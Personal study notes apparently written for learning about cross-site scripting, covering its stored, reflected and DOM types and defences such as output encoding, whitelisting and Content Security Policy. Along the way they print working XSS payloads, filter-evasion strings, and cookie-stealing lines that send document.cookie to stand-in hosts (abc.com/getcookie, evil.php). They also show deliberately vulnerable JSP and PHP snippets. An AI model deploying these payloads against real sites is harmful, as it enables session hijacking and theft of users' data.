---
title: Meow's CyberAttack - Application/Server Attacks - Scripts Injection - Cross Site Scripting
# author: Grace JyL
date: 2020-09-19 11:11:11 -0400
description:
excerpt_separator:
categories: [10CyberAttack, XSS]
tags: [CyberAttack, XSS, CheatSheet]
math: true
# pin: true
toc: true
# image: /assets/img/sample/devices-mockup.png
---

- [Meow's CyberAttack - Cross Site Scripting 跨站脚本](#meows-cyberattack---cross-site-scripting-跨站脚本)
  - [XSS attacks](#xss-attacks)
    - [XSS Attack Consequences](#xss-attack-consequences)
  - [XSS Attacks Type](#xss-attacks-type)
    - [Stored XSS Attacks](#stored-xss-attacks)
    - [Reflected XSS Attacks](#reflected-xss-attacks)
    - [DOM Based XSS](#dom-based-xss)
  - [what XSS is](#what-xss-is)
    - [Alternate XSS Syntax](#alternate-xss-syntax)
    - [what you can do with it](#what-you-can-do-with-it)
    - [How to Determine Vulnerable](#how-to-determine-vulnerable)
  - [XSS Attack Example](#xss-attack-example)
    - [Example: Reflected XSS](#example-reflected-xss)
    - [Example: Stored XSS](#example-stored-xss)
    - [Example: Cookie Grabber](#example-cookie-grabber)
    - [Error Page Example](#error-page-example)
  - [XSS Attack Prevention](#xss-attack-prevention)
    - [Countermeasures](#countermeasures)
    - [Input handling contexts](#input-handling-contexts)
    - [Inbound/outbound input handling](#inboundoutbound-input-handling)
    - [Encoding](#encoding)
    - [Validation](#validation)
    - [Content Security Policy (CSP)](#content-security-policy-csp)
      - [How to enable CSP](#how-to-enable-csp)
      - [Syntax of CSP](#syntax-of-csp)



Ref:
- [Stored & Reflected XSS and Testing with OWASP ZAP](https://www.youtube.com/watch?v=u12HB_WjmQE&ab_channel=DominicBatstone)
- [Cross-Site Scripting Explained - Part 2: DOM-Based XSS](https://www.youtube.com/watch?v=UFlF3F-XOG4&ab_channel=webpwnized)
- [Excess XSS](https://excess-xss.com/)

Book: S+ 7th ch9

---

# Meow's CyberAttack - Cross Site Scripting 跨站脚本

---

## XSS attacks


- Cross-Site Scripting (XSS) attacks

- web application vulnerability
  - 是代码注入的一种。
  - 将代码注入到网页上，其他用户在观看网页时就会受到影响。
- the basics of this attack revolve around website design, dynamic content, and invalidated input data.


![Pasted Graphic](https://i.imgur.com/9VHZkSZ.png)


Cross-Site Scripting (XSS) attacks occur when:

- `Data enters a Web application through an untrusted source` (web request.etc)
  - attacker take advantage of scripting and have it perform something other than the intended response.
    - sends a speciﬁc request to a website, embed malicious code into web site’s code.
    - The malicious content often is a segment of `JavaScript, HTML, Flash, or other type of code that the browser may execute`
    - use a client-side scripting language
  - trick a user who visits the site into having code execute locally.

- `malicious scripts are injected into trusted websites`.

- During page generation, the application `does not prevent the data from containing content that is executable by a web browser`

- `data included dynamic content that is sent to a web user without being validated` for malicious content.
  - Flaws that allow these attacks to succeed are quite widespread
  - occur anywhere a web application uses input from a user within generates the output of it without validating or encoding it.
  - causes the website to send malicious Web / email code to user.

- A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.

- `The code executes when the user visits the site`.
  - when a web form pops up, the user inputs something, and then some script dynamically changes the appearance or behavior of the website based on what has been entered.
  - 这类攻击通常包含了HTML以及用户端脚本语言
  - 通过客户端脚本语言（如 JavaScript), 在论坛发帖中发布一段恶意的JavaScript代码脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS

> By exploiting vulnerabilities of web server, attacker uses the website as an intermediary for transferring malicious code to another victim.
> attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
> victim is usually not aware of being exploited because as assumes the data received are from a valid Web server.



- finds website section where users can interact with each other.
  - like product review section.
  - in the input text field, the attacker types in some script (like JavaScript), next time a user visits that section of the website, the script is executed.
  - when the security of a web app relies on JavaScript for input validation, The integrity of the data is at risk.
- Example:
  - UserA gets a message about his XYZ account, but the link in the message is not really to the XYZ site (phishing ploy).
  - When he visits the site, a script routine begins to run on his machine with his permissions, can do things as running malevolent 有恶意的 routines to send, delete, or alter data.
  - A web application is configured to target browsers


---


### XSS Attack Consequences
The consequence of an XSS attack is the same regardless of whether it is stored or reflected (or DOM Based). The difference is in how the payload arrives at the server.


1. `has access to user's sensitive information`
   - the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.
   - disclosure of the user’s session cookie
   - copy cookies from the victim’s computer and relay them to the attacker.
   - allowing an attacker to hijack the user’s session and take over the account.
   - disclosure of end user files,

2. `installation of Trojan horse programs`

3. `redirect the user to some other page or site, controlled by the attacker`,
   - send HTTP requests with arbitrary content to arbitrary destinations
   - by using `XMLHttpRequest` and other mechanisms.

4. `modify presentation of content`
   - make arbitrary modifications to the HTML of the current page
   - by using DOM manipulation methods.
     - An XSS vulnerability allowing an attacker to modify a press release or news item could affect a company’s stock price or lessen consumer confidence.
     - An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose.

5. `performing malicious operations on the user’s machine` under the guise of the vulnerable site.

6. `Keylogging`
   - The attacker can register a keyboard event listener using `addEventListener`
   - send all of the user's keystrokes to his own server,
   - potentially recording sensitive information
   - such as passwords and credit card numbers.

7. `Phishing`
   - insert a fake login form into the page using DOM manipulation,
   - set the form's action attribute to target his own server,
   - and then trick the user into submitting sensitive information.


XSS can be used to perform badness on a target server.
- bring a target down with a good old DoS attack?
- send an XSS attack via e-mail?
- having the injected script remain permanently on the target server (like in a database, message forum, visitor log, or comment field)?
- be used to upload malicious code to users connected to the server, to send pop-up messages to users, and to steal virtually anything.
- That PHP session ID that identifies the user to the website stolen through an XSS, the attacker now and can masquerade as the user all day, plugged into a session.

XSS attacks can vary by application and by browser and can range from nuisance to severe impact, depending on what the attacker chooses to do.
- RSnake and https://hackers.org/xss.html are authoritative sources for XSS attacks.



---


## XSS Attacks Type

Different XSS Attacks
- `Stored` vs. `Reflected` XSS
- `Server` vs. `Client` XSS
  - `DOM Based XSS` is a subset of Client XSS.

---

### Stored XSS Attacks
- `Persistent / Type-I XSS`
- the injected script is **permanently stored on the target servers**
  - such as in a database, message forum, visitor log, comment field, etc.
- The victim retrieves the malicious script from the server when it requests the stored information.

```html
<Script>alert(‘XSS!’)</script>
<H1>Big Title</H1>
```

- Goal:
  - the user targets a `specific individual`, send the malicious URL to the victim (using e-mail or instant messaging, for example) and trick him into visiting it.
  - the user targets a `large group of people`, the attacker can publish a link to the malicious URL (on his own website or on a social network, for example) and wait for visitors to click it.


![persistent-xss](https://i.imgur.com/YdW8p1t.png)


---

### Reflected XSS Attacks
- `Non-Persistent / Type-II XSS`
- The user input is `been reflected as part of the page`.
- the injected script is reflected off the web server
  - such as in an error message, search result
  - any response that includes some input sent to the server as part of the request.
- Reflected attacks are delivered to victims via another route
  - such as in e-mail message, or on some other website.
  - When user click on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site
  - the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser.
  - The browser then executes the code because it came from a “trusted” server.

```html
<Script>alert(document.cookie)</script>
```

![Screen Shot 2020-09-19 at 15.27.24](https://i.imgur.com/fePlrGA.png)


![reflected-xss](https://i.imgur.com/mqBNTfb.png)


---


### DOM Based XSS
- `Document object model`.
- Type-0 XSS, identified by Amit Klein in 2005.
- the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script
  - `The malicious code does not come from the web server or database`.
  - It is `injected and stays in the browser the entire time`
  - the client side code runs in an “unexpected” manner.
  - the page itself (the HTTP response) does not change
  - but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

- This is in contrast to other XSS attacks (stored or reflected)
  - wherein the attack payload is placed in the response page (due to a server side flaw).
  - In **persistent and reflected XSS attacks**
    - the server inserts the malicious script into the page,
    - then sent in a response to the victim.
    - When the victim's browser receives the response, it assumes the malicious script to be part of the page's legitimate content and automatically executes it during page load as with any other script.
  - In **DOM-based XSS attack**
    - no malicious script inserted as part of the page;
    - the only script that is automatically executed during page load is a legitimate part of the page.
    - but this `legitimate script directly makes use of user input` in order to `add HTML to the page`.
    - Because the `malicious string is inserted into the page using` `innerHTML`, it is parsed as HTML, causing the malicious script to be executed.

- The difference is subtle but important:
  - In traditional XSS,
    - the malicious JavaScript is `executed when the page is loaded`,
    - as part of the HTML sent by the server.
  - In DOM-based XSS,
    - the malicious JavaScript is `executed at some point after the page has loaded`,
    - as a result of the `page's legitimate JavaScript treating user input in an unsafe way`.


![dom-based-xss](https://i.imgur.com/QUYYLBb.png)

Example

- code for create a form to let the user choose their preferred language.
- A default language is also provided in the query string, as the parameter “default”.


```js
// Select your language:
<select><script>
	document.write( "<OPTION value=1>" + document.location.href.substring(document.location.href.indexOf("default=")+8) + "</OPTION>" );
	document.write( "<OPTION value=2>English</OPTION>" );
</script></select>

// The page is invoked with a URL such as:
https://www.some.site/page.html?default=French

// A DOM Based XSS attack against this page can be accomplished by sending the following URL to a victim:
https://www.some.site/page.html?default=<script>alert(document.cookie)</script>

// When the victim clicks on this link, the browser sends a request to www.some.site.
/page.html?default=<script>alert(document.cookie)</script>

// The server responds with the page containing the above Javascript code.
// The browser creates a DOM object for the page, in which the document.location object contains the string:
https://www.some.site/page.html?default=<script>alert(document.cookie)</script>


// The original Javascript code in the page does not expect the default parameter to contain HTML markup, and as such it simply ecloes it into the page (DOM) at runtime.
// The browser then renders the resulting page and executes the attacker’s script:
alert(document.cookie)
```

Note that the HTTP response sent from the server does not contain the attacker’s payload. This payload manifests itself at the client-side script at runtime, when a flawed script accesses the DOM variable document.location and assumes it is not malicious.


1.	The attacker crafts a URL containing a malicious string and sends it to the victim.
2.	The victim is tricked by the attacker into requesting the URL from the website.
3.	The website receives the request, without the malicious string in the response.
4.	The victim's browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.
5.	The victim's browser executes the malicious script inserted into the page, sending the victim's cookies to the attacker's server.


Why DOM-based XSS matters
- In the previous example, JavaScript was not necessary;
- the server could have generated all the HTML by itself.
- If the server-side code were free of vulnerabilities, the website would then be safe from XSS.

However, as web applications become more advanced, an `increasing amount of HTML is generated by JavaScript on the client-side rather than by the server`.
- Any time content needs to be changed without refreshing the entire page, the update must be performed using JavaScript.
- Most notably, this is the case when a page is updated after an AJAX request.
- This means that XSS vulnerabilities can be present not only in your website's server-side code, `but also in your website's client-side JavaScript code`.
- Consequently, even with completely secure server-side code, the client-side code might still unsafely include user input in a DOM update after the page has loaded.
- If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.

DOM-based XSS invisible to the server
- special case of DOM-based XSS
- `the malicious string is never sent to the website's server to begin with`:
- when the malicious string is contained in a URL's fragment identifier (anything after the # character).
- Browsers do not send this part of the URL to servers, so the website has no way of accessing it using server-side code.
- The client-side code, however, has access to it and can thus cause XSS vulnerabilities by handling it unsafely.
- This situation is not limited to fragment identifiers. Other user input that is invisible to the server includes new HTML5 features like LocalStorage and IndexedDB.


---


## what XSS is

### Alternate XSS Syntax

XSS Using Script in Attributes
- conducted with `<script>...</script>` tags.
- Other tags: `<body onload=alert('test1')>` 
- Onmouseover: `<b onmouseover=alert('Wufff!')>click me!</b>`
- Onerror: `<img alt="pic" src="https://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

XSS Using Script Via Encoded URI Schemes
- to hide against web application filters, encode string characters,
- e.g.: `a=&\#X41 (UTF-8)`
- use it in IMG tags: `<IMG SRC=j&#X41vascript:alert('test2')>`

XSS Using Code Encoding
- encode script in `base64` and place it in META tag.
- This way get rid of `alert()` totally.
- `<META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html; base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">`


One of the classic attacks:

getting access to “`document.cookie`” and sending it to a remote host.
- used the following in a form field entry instead of providing your name:
- `&lt;script;window.open#40;&quot;https://abc.com/getcookie.acookie=&quot;+document.cookie#41;&lt;/script&gt;`
- Should the app be vulnerable to XSS, the Java script entered (converted to HTML entities where appropriate—how fun!) will be run and you can obtain cookies from users accessing the page later


---

### what you can do with it

Recognize URL indicator of an XSS attempt:
- `https://IPADDRESS/′′;!- -′′<XSS>=&{()}`
- XSS attempts pop up all over the place in in all sorts of formats.



### How to Determine Vulnerable
- perform a `security review of the code`
- search for `all places where input from an HTTP request` could possibly make its way into the HTML output.
- `variety of different HTML tags can be used to transmit a malicious JavaScript`.
- Nessus, Nikto, and some other available tools can help scan a website for these flaws, but can only scratch the surface.
- If one part of a website is vulnerable, there is a high likelihood that there are other problems as well.

---

## XSS Attack Example

Cross-site scripting attacks may occur anywhere

- where users are allowed to post unregulated material to a trusted website for the consumption of other valid users.

- The most common example can be found in bulletin-board websites which provide web based mailing list-style functionality.

### Example: Reflected XSS

- The following JSP code <font color=LightSlateBlue> segment reads an employee ID, eid, from an HTTP request and displays it to the user. </font>

  ```jsp
  <% String eid = request.getParameter("eid"); %>
  Employee ID: <%= eid %>
  ```

- The code in this example operates correctly if `eid` contains only standard alphanumeric text.

- <font color=OrangeRed> If eid has a value that includes meta-characters or source code </font>
  - then the code will be executed by the web browser as it displays the HTTP response.

- attacker will create the malicious `URL`, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL.

- `When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers`.

- This mechanism of exploiting vulnerable web applications is known as <font color=OrangeRed> Reflected XSS </font>.


### Example: Stored XSS

- The following JSP code <font color=LightSlateBlue> segment queries a database for an employee with a given ID and prints the corresponding employee’s name </font>.

  ```jsp
  <%...
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery("select * from emp where id="+ eid );
    if (rs != null) {
      rs.next();
      String name = rs.getString("name");
  %>
  Employee Name: <%= name %>
  ```

- code functions correctly when the values of name are well-behaved,

- this code can appear less dangerous because `the value of name is read from a database`
  - contents are apparently managed by the application.

- However, if `the value of name originates from user-supplied data`, then the database can be a conduit for malicious content.
  - Malicious user stor malicious input in database

- Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user’s web browser.

- This type of exploit, known as <font color=OrangeRed> Stored XSS </font>
  - particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users.

- XSS got its start in this form with websites that offered a “guestbook” to visitors.
  - Attackers would include JavaScript in their guestbook entries
  - and all subsequent visitors to the guestbook page would execute the malicious code.



As the examples demonstrate, XSS vulnerabilities are caused by `code that includes unvalidated data in an HTTP response`. There are `three vectors` by which an XSS attack can reach a victim:

- As in Example 1, <font color=OrangeRed> data is read directly from the HTTP request and reflected back in the HTTP response </font>.
  - Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser.
  - The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.
  - URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site.
  - After the site reflects the attacker’s content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user’s machine to the attacker or perform other nefarious activities.

- As in Example 2, <font color=OrangeRed> the application stores dangerous data in a database or other trusted data store </font>. The dangerous data is subsequently read back into the application and included in dynamic content.
  - Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content.
  - From an attacker’s perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users.
  - Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker.
  - If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.

- A source outside the application <font color=OrangeRed> stores dangerous data in a database or other data store, and the dangerous data is subsequently read back </font> into the application as trusted data and included in dynamic content.


### Example: Cookie Grabber

- If the application doesn’t validate the input data

- the attacker can steal a cookie from an authenticated user.

- All the attacker has to do is to place the following code in any posted input (ie: message boards, private messages, user profiles):

- The code will pass an escaped content of the cookie (according to RFC, <font color=LightSlateBlue> content must be escaped before sending it via HTTP protocol with GET method </font>) to the `evil.php script` in “`cakemonster`” variable.

- The attacker then checks the results of their `evil.php script` and use it.
  - a cookie grabber script will usually write the cookie to a file

```php
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>
```

### Error Page Example

- an error page, handling requests for a non existing pages, a classic 404 error page.

- may use the code to inform user about what specific page is missing:

```html
<html>
	<body>
		<? php
		print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
		?>
	</body>
</html>
```

1. try: 
   - `http://testsite.test/file_which_not_exist` 
2. In response we get: 
   - `Not found: /file_which_not_exist`
3. force the error page to include our code: 
   - `http://testsite.test/<script>alert("TEST");</script> `
4. The result is: 
   - `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`
5. We have successfully injected the code, may use this to steal user’s session cookie.


---

## XSS Attack Prevention


### Countermeasures

1. Don’t trust input

2. **Input validation** `The primary protection`
   - the web application with sophisticated `input validation techniques`.
   - `constrain 约束 and sanitize` the input data stream,
   - `Validation, filters the user input` so that the browser interprets it as code without malicious commands.
   - All input data should be `checked for data type, format, range, and irregular expressions`.
   - `Whiltelist` of allowed values
   - `avoid methods that allow the web page to display untrusted data`.
   - Input originating from server controls should be subject to `ASP.NET validator controls` such as `RangeValidator`.

3. use a **security encoding library** `OWASP strongly recommends`
   - escapes user input so the browser `interprets it as data, not as code`
   - encoding library will `sanitize HTML code`
   - `encode output` that contains user input data or data from databases.
   - `HtmlEncode`: encode characters with special designations in HTML
     - obscuring executable code that would otherwise be run.
     - `Label1.Text = “This is output:” + Server.HtmlEncode(TextBox1.Text);`
   - Replace "<" and ">" characters with "& lt;" and "& gt;" using server scripts

4. Use buildin protection on frame or library
   - VS: `ValidationRequest=“false”`

5. Use **security headers**
   - `CSP, contact security policy`
   - `X-XSS-protection`

6. Set **flags on cookies**
   - `HttpOnly, Secure`

7. educate users about the dangers of clicking links.
   - Some XSS attacks send emails with malicious links within them.

8. `turn off HTTP TRACE support on all web servers`.
   - An attacker can steal cookie data via Javascript even when `document.cookie` is disabled or not supported by the client.
   - This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the user’s cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack.
   - mitigated by removing support for HTTP TRACE on all web servers.


---

- **Context**
  - `Secure input handling` needs to be performed differently depending on where in a page the user input is inserted.
- **Inbound/outbound**
  - `Secure input handling` can be performed either when your website receives the input (inbound) or right before your website inserts the input into a page (outbound).
- **Client/server**
  - `Secure input handling` can be performed either on the client-side or on the server-side, both of which are needed under different circumstances.

---

### Input handling contexts

contexts in a web page where user input might be inserted.
- specific rules must be followed
- so that the user input cannot break out of its context and be interpreted as malicious code.


| Context              | Example code                              |
| -------------------- | ----------------------------------------- |
| HTML element content | `<div>userInput</div>`                    |
| HTML attribute value | `<input value="userInput">`               |
| URL query value      | `https://example.com/?parameter=userInput` |
| CSS value            | `color: userInput`                        |
| JavaScript value     | `var name = "userInput";`                 |


- XSS vulnerability arise if user input were inserted, before being encoded or validated.
- An attacker would then be able to inject malicious code by simply inserting the closing delimiter for that context and following it with the malicious code.

For example,
- if a website inserts user input directly into an HTML attribute,
- an attacker would be able to inject a malicious script by beginning his input with a quotation mark:

| Context          | Example                                                |
| ---------------- | ------------------------------------------------------ |
| Application code | `<input value="userInput">`                            |
| Malicious string | `"><script>...</script><input value="`                 |
| Resulting code   | `<input value=""><script>...</script><input value="">` |



### Inbound/outbound input handling
- Relying on inbound input handling to prevent XSS is thus a very brittle solution that will be prone to errors. (The deprecated "magic quotes" feature of PHP is an example of such a solution.)
- Instead, `outbound input handling should be your primary line of defense against XSS`, because it can take into account the specific context that user input will be inserted into.

Where to perform secure input handling
- In most modern web applications, to protect against all types of XSS,
- secure user input handling must be performed in `both the server-side code and the client-side code`.
  - to protect against **traditional XSS**,
    - secure input handling must be performed in `server-side code`.
    - This is done using any language supported by the server.
  - to protect against **DOM-based XSS**
    - where the server never receives the malicious string (such as the fragment identifier attack described earlier),
    - secure input handling must be performed in `client-side code`.
    - This is done using JavaScript.




---


### Encoding
- use a security encoding library.
- OWASP strongly recommends
- escapes user input so the browser interprets it as data, not as code.
- encoding library will sanitize HTML code and prevent XSS attacks.
- encode output that contains user input data or data from databases.
- HtmlEncode: encode characters with special designations in HTML
- obscuring executable code that would otherwise be run.
- ` Label1.Text = “This is output:” + Server.HtmlEncode(TextBox1.Text);`
- Replace "<" and ">" characters with "`&lt;`" and "`&gt;`" using server scripts

![Screen Shot 2020-09-21 at 12.37.13](https://i.imgur.com/ToXYR3i.png)


```py
print "<html>"
print "Last comment: "
print encodeHtml(userInput)
print "</html>"


user: <script>...</script>

# after encoding
print "<html>"
print "Last comment: "
print encodeHtml(<script>...</script>)
print "</html>"

# user result
# no xss execute
<html>
Last comment:
&lt;script&gt;...&lt;/script&gt;
</html>
```




**Encoding on the client-side**
encoding user input on the client-side using JavaScript, several built-in methods and properties that automatically encode all data in a context-aware manner:


| Context              | Method/property                              |
| -------------------- | -------------------------------------------- |
| HTML element content | `node.textContent = userInput`               |
| HTML attribute value | `element.setAttribute(attribute, userInput)` |
| .                    | `element[attribute] = userInput`             |
| URL query value      | `window.encodeURIComponent(userInput)`       |
| CSS value            | `element.style.property = userInput`         |

JavaScript provides no built-in way of encoding data to be included in JavaScript source code.


**Limitations of encoding**
when user input is used to provide URLs, such as in the example below:

`document.querySelector('a').href = userInput`

1. Although assigning a value to the `href` property of an anchor element automatically encodes it so that it becomes nothing more than an attribute value
2. this in itself `does not prevent the attacker from inserting a URL beginning with "javascript:"`
   - When the link is clicked, whatever JavaScript is embedded inside the URL will be executed.
3. `Encoding is an inadequate solution when you actually want the user to define part of a page's code`
   - An example is a user profile page where the user can define custom HTML.
   - If this custom HTML were encoded, the profile page could consist only of plain text.
4. Encoding should be your first line of defense against XSS, because its very purpose is to neutralize data so that it cannot be interpreted as code.
5. In some cases, encoding needs to be complemented with validation,


---

### Validation
- filtering user input
- all malicious parts of it are removed, without necessarily removing all code in it.
- One of the most recognizable types of validation in web development is
  - allowing some HTML elements (such as `<em> and <strong>`)
  - disallowing others (such as `<script>`)
- two main characteristics of validation that differ between implementations:
  - **Classification strategy**: User input can be classified using either `blacklisting` or `whitelisting`.
  - **Validation outcome**: User input identified as malicious can either be `rejected` or `sanitised`.


Classification strategy

- **Blacklisting**
  - defining a `forbidden pattern that should not appear in user input`.
    - If a string matches this pattern, it is then marked as invalid.
    - example:
    - allow users to submit custom URLs with any protocol except `javascript:`.
  - 2 major drawbacks:
    - **Complexity**
      - Accurately have set of all possible malicious strings is a complex task.
      - The example policy described above could not be successfully implemented by simply searching for the substring `"javascript"`,
      - because this would miss strings of the form `"Javascript:"` (first letter is capitalized) and `"&#106;avascript:"` (first letter is encoded as a numeric character reference).
    - **Staleness**
      - Even if a perfect blacklist were developed, it would fail if a new feature allowing malicious use were added to the browser.
      - For example
      - an HTML validation blacklist developed before the introduction of the HTML5 onmousewheel attribute, would fail to stop an attacker from using that attribute to perform an XSS attack.
      - This drawback is especially significant in web development, which is made up of many different technologies that are constantly being updated.
      - Because of these drawbacks, blacklisting as a classification strategy is strongly discouraged.

- **Whitelisting** `safer approach`
  - instead of defining a forbidden pattern, defines an allowed pattern
  - marks input as invalid if it does not match this pattern.
    - Example
    - allow users to submit custom URLs containing only the protocols `http:` and `https:`, nothing else.
    - This approach would automatically mark a URL as invalid if it had the protocol `javascript:`,
    - even "`Javascript:`" or "`&#106;avascript:`".
  - 2 major benefits of whitelisting:
    - **Simplicity**
      - `Accurately describing a set of safe strings` is generally much easier than identifying the set of all malicious strings.
      - especially true when user input only needs to include very limited subset of the functionality available in a browser.
      - For example,
      - the whitelist described above allowing only URLs with the protocols `http:` or `https:` is very simple, and perfectly adequate for users in most situations.
    - **Longevity**
      - generally not become obsolete when a new feature is added to the browser.
      - For example
      - an HTML validation whitelist allowing only the title attribute on HTML elements
      - remain safe after the introduction of HTML5 onmousewheel attribute.

**Validation outcome**
- **Rejection**
  - The input is simply rejected, preventing it from being used elsewhere in the website.
- **Sanitisation**
  - All invalid parts of the input are removed,
  - the remaining input is used normally by the website.
- Of these two, **rejection** is the simplest approach to implement.
  - to implement sanitisation, you must make sure that the sanitisation routine itself doesn't use a blacklisting approach.
  - For example,
  - the URL "`Javascript:...`", even when identified as invalid using a whitelist approach, would get past a sanitisation routine that simply removes all instances of "`javascript:`".
  - For this reason, well-tested libraries and frameworks should be used for sanitisation whenever possible.


---


### Content Security Policy (CSP)
- using only secure input handling is that even a single lapse of security
- Web standard CSP can mitigate this risk.
- CSP is used to `constrain the browser viewing your page`
  - it can only use resources downloaded from trusted sources.
    - A resource is a `script, a stylesheet, an image, or some other type of file` referred to by the page.
  - even if
    - an attacker succeeds in `injecting malicious content` into your website,
    - the `website failed to securely handle user input`
      - CSP can prevent it from ever being executed
      - prevented the vulnerability from causing any harm.
    - Even if the attacker had `injected the script code inline` rather than linking to an external file
      - a properly defined CSP policy disallowing inline JavaScript would also have prevented the vulnerability from causing any harm.


- CSP can be used to enforce the following rules:
  - **No untrusted sources**
    - External resources can only be loaded from a set of clearly defined trusted sources.
  - **No inline resources**
    - Inline JavaScript and CSS will not be evaluated.
  - **No eval**
    - The JavaScript `eval function` cannot be used.


CSP in action
- example,
  - an attacker has succeeded in injecting malicious code into a page:
  - With a properly defined CSP policy
  - the browser `would not load and execute malicious‑script.js `
  - because `https://attacker/` is not in the set of trusted sources.

```html
<html>
Latest comment:
<script src="https://attacker/malicious‑script.js"></script>
</html>
```



#### How to enable CSP
- By default, browsers do not enforce CSP.
- To enable CSP on your website, pages must be served with an additional HTTP header: `Content‑Security‑Policy`.
  - Any page served with this header will have its security policy respected by the browser loading it, provided that the browser supports CSP.
  - the security policy is sent with every HTTP response,

- it is possible for a server to set its policy on a page-by-page basis.
  - The same policy can be applied to an entire website by providing the same CSP header in every response.

- The value of the `Content‑Security‑Policy header` is a string defining one or more security policies that will take effect on your website.
  - The example headers in this section use newlines and indentation for clarity;
  - this should not be present in an actual header.



#### Syntax of CSP

```bash
Content‑Security‑Policy:    
directive source‑expression, source‑expression, ...;    
directive ...;    ...
```

The syntax of a CSP header made up of two elements:
- `Directives`:
  - strings specifying a type of resource, taken from a predefined list.
- `Source expressions`:
  - patterns describing one or more servers that resources can be downloaded from.

> For every `directive`,
> the `given source expressions` define which sources can be used to download resources of the respective type.


- Directives
  - The directives that can be used in a CSP header are as follows:
  - connect‑src
  - font‑src
  - frame‑src
  - img‑src
  - media‑src
  - object‑src
  - script‑src
  - style‑src
  - the special directive default‑src 
    - can be used to provide a default value for all directives that have not been included in the header.

- Source expressions
  - The syntax of a source expression is as follows:
  - `protocol://host‑name:port‑number`
  - The host name can start with `*.`,
    - which means that any subdomain of the provided host name will be allowed.
  - Similarly, the port number can be `*`,
    - which means that all ports will be allowed.
  - Additionally, the protocol and port number can be omitted.
  - a protocol can be given by itself, possible to require that all resources be loaded using HTTPS.

  - In addition to the syntax above, a source expression can alternatively be one of four keywords with special meaning (quotes included):
  - `none`
    - Allows no resources.
  - `self`
    - Allows resources from the host that served the page.
  - `unsafe‑inline`
    - Allows resources embedded in the page, such as inline `<script>` elements, `<style>` elements, and `javascript: URLs`.
  - `unsafe‑eval`
    - Allows the use of the JavaScript eval function.

  - when CSP is used, inline resources and eval are automatically disallowed by default.
    - Using `unsafe‑inline` and `unsafe‑eval` is the only way to allow them.


An example policy

```bash
# the page is subject to the following restrictions:
Content‑Security‑Policy:    

# Scripts can be downloaded only from the host serving the page and from `scripts.example.com.`
script‑src 'self' scripts.example.com;   

# Audio and video files cannot be downloaded from anywhere. 
media‑src 'none';    

# Image files can be downloaded from any host.
img‑src *;    

# All other resources can be downloaded only from the host serving the page and from any subdomain of example.com
default‑src 'self' https://*.example.com
```


Status of CSP
- As of June 2013, Content Security Policy is a W3C candidate recommendation.
- It is being implemented by browser vendors, but parts of it are still browser-specific.
- In particular, the HTTP header to use can differ between browsers.
- Before using CSP today, consult the documentation of the browsers that you intend to support.
